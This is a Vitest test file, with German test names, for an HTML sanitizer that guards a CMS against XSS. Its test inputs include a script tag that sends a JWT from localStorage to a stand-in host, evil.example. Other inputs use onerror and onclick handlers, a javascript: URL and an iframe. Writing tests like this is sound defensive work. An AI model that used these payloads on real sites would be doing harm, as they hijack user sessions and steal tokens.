import { describe, it, expect } from 'vitest';
import { sanitizeHtml } from './sanitize';

describe('sanitizeHtml (XSS-Schutz, Review F1)', () => {
  it('lässt erlaubtes CMS-HTML durch', () => {
    const html = '<h2>Titel</h2><p><strong>fett</strong> und <em>kursiv</em></p><ul><li>Punkt</li></ul>';
    expect(sanitizeHtml(html)).toBe(html);
  });

  it('lässt Tabellen durch (Seed-Content nutzt sie)', () => {
    const html = '<table><tr><th>Woche</th></tr><tr><td>1–2</td></tr></table>';
    expect(sanitizeHtml(html)).toContain('<td>1–2</td>');
  });

  it('entfernt script-Tags', () => {
    const out = sanitizeHtml('<p>ok</p><script>document.location="https://evil.example/"+localStorage.getItem("healrise_jwt")</script>');
    expect(out).not.toContain('script');
    expect(out).toContain('<p>ok</p>');
  });

  it('entfernt Event-Handler-Attribute', () => {
    const out = sanitizeHtml('<img src="x.png" onerror="alert(1)"><a href="/ok" onclick="alert(1)">link</a>');
    expect(out).not.toContain('onerror');
    expect(out).not.toContain('onclick');
    expect(out).toContain('<img src="x.png">');
  });

  it('entfernt javascript:-URLs', () => {
    const out = sanitizeHtml('<a href="javascript:alert(1)">klick</a>');
    expect(out).not.toContain('javascript:');
  });

  it('entfernt iframe/object/style', () => {
    const out = sanitizeHtml('<iframe src="https://evil.example"></iframe><style>*{display:none}</style><p>bleibt</p>');
    expect(out).toBe('<p>bleibt</p>');
  });

  it('behandelt leere Eingaben', () => {
    expect(sanitizeHtml('')).toBe('');
    expect(sanitizeHtml(null)).toBe('');
    expect(sanitizeHtml(undefined)).toBe('');
  });
});
